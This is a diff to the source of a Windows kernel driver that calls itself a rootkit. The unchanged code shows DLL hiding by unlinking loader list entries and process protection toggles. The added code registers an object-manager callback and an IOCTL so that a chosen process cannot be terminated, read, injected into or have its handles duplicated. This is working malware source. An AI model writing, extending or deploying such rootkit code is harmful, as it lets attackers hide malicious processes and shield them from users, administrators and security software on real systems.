@@ -13,6 +13,12 @@ void debug_print(PCSTR text) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
 }
 /*
+Globals
+*/
+PVOID regHandle;
+ULONG protectedPid;
+
+/*
 Functions 
 */
 ULONG TOKEN_OFFSET = 0;
@@ -146,7 +152,7 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
 WCHAR* ExtractFileName(const WCHAR* fullPath) {
     // Find the last backslash.
     const WCHAR* lastSlash = wcsrchr(fullPath, L'\\');
-    // If the backslash is NOT NULL, it will point to the next letter (which is the start of the filename), and truncate everything behind it so only the filename is left.
+    // If the backslash is NOT NULL (which means that it exists), it will point to the next letter (which is the start of the filename), and truncate everything behind it so only the filename is left.
     return lastSlash ? (WCHAR*)(lastSlash + 1) : (WCHAR*)fullPath;
 }
 
@@ -236,7 +242,7 @@ VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
             if (_wcsicmp(entryFileName, DLLName) == 0) {
                 debug_print("[+] Found matching DLL, unlinking from lists\n");
                 moduleBase = entry->DllBase;
-                // If found, start unlinking from the doubly-linked list.
+                // If found, start unlinking from the doubly-lined list.
                 FlinkBlinkHide(&entry->InLoadOrderLinks);
                 FlinkBlinkHide(&entry->InInitializationOrderLinks);
                 FlinkBlinkHide(&entry->InMemoryOrderLinks);
@@ -455,6 +461,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG UnProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcessOP =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -535,6 +543,9 @@ namespace Rootkit {
         case codes::UnProtectProcess:
             UnProtectProcess(HandleToUlong(pid));
             break;
+        case codes::ProtectProcessOP:
+            protectedPid = HandleToUlong(pid);
+            break;
         default:
             // something is horribly wrong
             debug_print("[!] Unknown control code received!");
@@ -556,6 +567,11 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     IoDeleteSymbolicLink(&symbolic_link);
     debug_print("[+] Symbolic link deleted.\n");
 
+    // Unregister callbacks
+#ifdef DL
+    ObUnRegisterCallbacks(regHandle);
+#endif
+
     // Delete device object(s)
     PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
     while (device_object) {
@@ -566,6 +582,27 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     debug_print("[+] Device object(s) deleted.\n");
 }
 
+// Register the pre open process operation callback - which means that everytime a process is opened (handled), it will first come here.
+OB_PREOP_CALLBACK_STATUS PreOpenProcessOperation(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
+    if (Info->KernelHandle) {
+        return OB_PREOP_SUCCESS; // If it's a handle that is called by the kernel driver, we just return success. I might modify this so it also rejects, but IDK if it's possible.
+    }
+    // Get the process EPROCESS from the callback
+    PEPROCESS process = (PEPROCESS)Info->Object;
+    // Use the function to retrieve it's pid from the EPROCESS, we could also manually do this but who cares lol.
+    UINT32 pid = HandleToUlong(PsGetProcessId(process));
+
+    // Protecting our process by stripping PROCESS_TERMINATE from the flags.
+    if (pid == protectedPid) {
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE; // Do bitwise AND on the left side of the equation here, which will result on 0 on the desired access, (which is the opposite of process terminate).
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
+        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
+    }
+
+    return OB_PREOP_SUCCESS;
+}
 
 NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
     UNREFERENCED_PARAMETER(registry_path);
@@ -599,7 +636,32 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     debug_print("[+] Driver symbolic link creation successful.\n");
 
 #ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
-    // THIS IS PLANNED.
+    OB_OPERATION_REGISTRATION operations[] = {
+        {
+            PsProcessType, // object type
+            OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE, // type of operation we want to callback
+            PreOpenProcessOperation, nullptr // pre operation, post operation.
+}
+    };
+    
+    OB_CALLBACK_REGISTRATION reg = {
+        OB_FLT_REGISTRATION_VERSION, // just use the current version
+        1, // 1 is the amount of registrations we did, so far its 1.
+        RTL_CONSTANT_STRING(L"389998"), // unique code for our registration driver
+        nullptr, // registration context is null for now
+        operations // our operations we want to callback
+    };
+
+    status = ObRegisterCallbacks(&reg, &regHandle);
+    if (!NT_SUCCESS(status)) {
+        debug_print("[!] Failed to register callbacks\n");
+        // Clean up resources but allow driver to continue
+        DbgPrint("FAILED TO REGISTER CALLBACKS, STATUS=%08X\n", status);
+        IoDeleteSymbolicLink(&symbolic_link);
+        IoDeleteDevice(device_object);
+        return status;
+    }
+    debug_print("[+] Callbacks registered successfully\n");
 #endif
 
     // Setup IOCTL Comm.
